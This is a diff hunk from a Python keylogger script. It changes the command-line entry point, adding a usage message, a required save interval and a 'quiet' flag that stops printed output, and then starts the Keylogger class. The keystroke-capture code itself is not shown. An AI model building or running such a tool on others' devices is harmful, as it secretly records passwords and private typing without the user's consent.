@@ -61,7 +61,17 @@ class Keylogger:
         keyboard.wait()
         
 if __name__ == "__main__":
-    parser = OptionParser()
-    parser.add_option("-i", "--interval", dest="interval", help="the interval at which a keylog is to be saved (in seconds)")   # Interval Variable
-    parser.add_option("-q", "--quiet", dest="isHidden", default=False, help="don't print messages to stdout")
+    parser = OptionParser(usage="-i <interval>")
+    parser.add_option("-i", "--interval", dest="interval", metavar="INTERVAL", help="the interval at which a keylog is to be saved (in seconds)")    # Interval Variable
+    parser.add_option("-q", "--quiet", action="store_true", dest="isHidden", default=False, help="don't print messages to stdout")                                       # Quiet Variable
     (options, args) = parser.parse_args()
+    
+    if options.interval == None:
+        print(parser.usage)
+        exit(0)
+    
+    interval = int(options.interval)
+    quiet = options.isHidden
+    
+    keylogger = Keylogger(interval, quiet)
+    keylogger.start()
